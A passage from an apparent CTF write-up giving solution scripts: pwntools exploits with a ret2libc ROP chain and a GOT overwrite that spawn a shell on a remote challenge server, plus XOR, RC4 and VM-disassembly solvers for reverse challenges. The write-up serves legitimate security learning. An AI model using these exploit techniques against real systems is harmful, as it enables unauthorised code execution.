</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;puts&#34;</span>]
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name?&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(p64(pop_rdi) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)<span style="color:#f92672">.</span>__next__()) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;s??&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-40&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 98; 
			flex-basis: 236px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/justdoit_flag.png" data-size="920x935">
		<img src="/post/dnuictf-writeup-by-or4nge/justdoit_flag.png"
			width="920"
			height="935"
			srcset="/post/dnuictf-writeup-by-or4nge/justdoit_flag_hu5b35613d8237bffa3a456163560a9e5c_152476_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/justdoit_flag_hu5b35613d8237bffa3a456163560a9e5c_152476_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="reallneedgoodluck">reallNeedGoodLuck</h3>
<p>任意地址四字节写， 改error的got表为main，改atoi的got表为system，撞上的几率很大，直接手动爆破就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.23.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;47.106.172.144&#34;</span>, <span style="color:#ae81ff">65003</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#34;./reallNeedGoodLuck.1&#34;)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;good&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa9\x11\x40\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;luck!&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4210744&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;good&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\xa0\xf3</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;luck!&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4210734&#34;</span>)
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 74; 
			flex-basis: 177px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/reallNeedGoodLuck_flag.png" data-size="808x1091">
		<img src="/post/dnuictf-writeup-by-or4nge/reallNeedGoodLuck_flag.png"
			width="808"
			height="1091"
			srcset="/post/dnuictf-writeup-by-or4nge/reallNeedGoodLuck_flag_huba92621b780a05f9686296760b6accd9_126748_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/reallNeedGoodLuck_flag_huba92621b780a05f9686296760b6accd9_126748_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h2 id="reverse">Reverse</h2>
<h3 id="签到signin">[签到]Signin</h3>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 448; 
			flex-basis: 1075px"
	>
	<a href="/post/dnuictf-writeup-by-or4nge/Signin_flag.png" data-size="560x125">
		<img src="/post/dnuictf-writeup-by-or4nge/Signin_flag.png"
			width="560"
			height="125"
			srcset="/post/dnuictf-writeup-by-or4nge/Signin_flag_hue4682e70a343556bcc5ae6844af20877_11339_480x0_resize_box_3.png 480w, /post/dnuictf-writeup-by-or4nge/Signin_flag_hue4682e70a343556bcc5ae6844af20877_11339_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<h3 id="萌新happyctf">[萌新]happyCTF</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rxusoCqxw{yqK`{KZqag{r`i&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s:
</span></span><span style="display:flex;"><span>    print(chr(ord(i)<span style="color:#f92672">^</span><span style="color:#ae81ff">0x14</span>),end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#flag{Welcome_to_Neusoft}</span>
</span></span></code></pre></div><h3 id="remember-crypt-4">Remember Crypt 4</h3>
<p>rc4加密，根据密钥解密即可</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__rc4_init</span>(key):
</span></span><span style="display:flex;"><span>    keylength <span style="color:#f92672">=</span> len(key)
</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">256</span>))
</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> S[i] <span style="color:#f92672">+</span> key[i <span style="color:#f92672">%</span> keylength]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        S[i], S[j] <span style="color:#f92672">=</span> S[j], S[i]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> S
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rc4_crypt</span>(key, data):
</span></span><span style="display:flex;"><span>    S <span style="color:#f92672">=</span> __rc4_init(key)
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> data:
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> S[i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>        S[i], S[j] <span style="color:#f92672">=</span> S[j], S[i]
</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">=</span> (a <span style="color:#f92672">^</span> S[(S[i] <span style="color:#f92672">+</span> S[j]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>])<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">+=</span> k
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>l <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x5F</span>, <span style="color:#ae81ff">0xA7</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xF1</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0xAB</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x0E</span>, <span style="color:#ae81ff">0x8D</span>, <span style="color:#ae81ff">0x2B</span>]
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> l:
</span></span><span style="display:flex;"><span>    n<span style="color:#f92672">.</span>append(i<span style="color:#f92672">^</span><span style="color:#ae81ff">0x22</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s, s2n
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>(k):
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> k <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        ret<span style="color:#f92672">.</span>append(k <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
</span></span><span style="display:flex;"><span>        k <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>print(rc4_crypt(convert(s2n(<span style="color:#e6db74">&#39;12345678abcdefghijklmnopqrspxyz&#39;</span>)),n))
</span></span><span style="display:flex;"><span><span style="color:#75715e">#flag{nice_to_meet_you}</span>
</span></span></code></pre></div><h3 id="easyre">EasyRe</h3>
<p>用信号量实现的VM，先手动反汇编</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>code <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">20</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sub_400E1D <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;push(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">);&#34;</span>
</span></span><span style="display:flex;"><span>sub_400E78 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pop(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">);&#34;</span>
</span></span><span style="display:flex;"><span>sub_400F16 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> += </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">;&#34;</span>
</span></span><span style="display:flex;"><span>sub_400FA8 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> -= </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 20</span>
</span></span><span style="display:flex;"><span>eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 16</span>
</span></span><span style="display:flex;"><span>ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 17</span>
</span></span><span style="display:flex;"><span>ecx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 18</span>
</span></span><span style="display:flex;"><span>edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># 19</span>
</span></span><span style="display:flex;"><span>memory <span style="color:#f92672">=</span> [<span style="color:#ae81ff">2</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>memory2 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">50</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> eip <span style="color:#f92672">&lt;</span> len(code):
</span></span><span style="display:flex;"><span>    cur_op <span style="color:#f92672">=</span> code[eip]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> (eip), sub_400E1D<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eax&#34;</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> (eip), sub_400E1D<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> eax
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ebx&#34;</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> (eip), sub_400E1D<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> ebx
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ecx&#34;</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> (eip), sub_400E1D<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        memory[edx] <span style="color:#f92672">=</span> ecx
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eax&#34;</span>
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400E78<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">=</span> memory[edx]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ebx&#34;</span>
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400E78<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        ebx <span style="color:#f92672">=</span> memory[edx]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ecx&#34;</span>
</span></span><span style="display:flex;"><span>        edx <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400E78<span style="color:#f92672">.</span>format(cur_arg))
</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">=</span> memory[edx]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">7</span>:
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">+=</span> ebx
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">&#34;eax += ebx;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400F16<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;eax&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">+=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">9</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400F16<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;ebx&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        ebx <span style="color:#f92672">+=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400F16<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;ecx&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        ecx <span style="color:#f92672">+=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">11</span>:
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">-=</span> ebx
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, <span style="color:#e6db74">&#34;eax -= ebx;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">12</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400FA8<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;eax&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        eax <span style="color:#f92672">-=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cur_op <span style="color:#f92672">==</span> <span style="color:#ae81ff">13</span>:
</span></span><span style="display:flex;"><span>        cur_arg <span style="color:#f92672">=</span> code[eip <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;_</span><span style="color:#e6db74">%02X</span><span style="color:#e6db74">:&#34;</span> <span style="color:#f92672">%</span> eip, sub_400FA8<span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;ebx&#34;</span>, cur_arg))
</span></span><span style="display:flex;"><span>        ebx <span style="color:#f92672">-=</span> cur_arg
</span></span><span style="display:flex;"><span>        eip <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
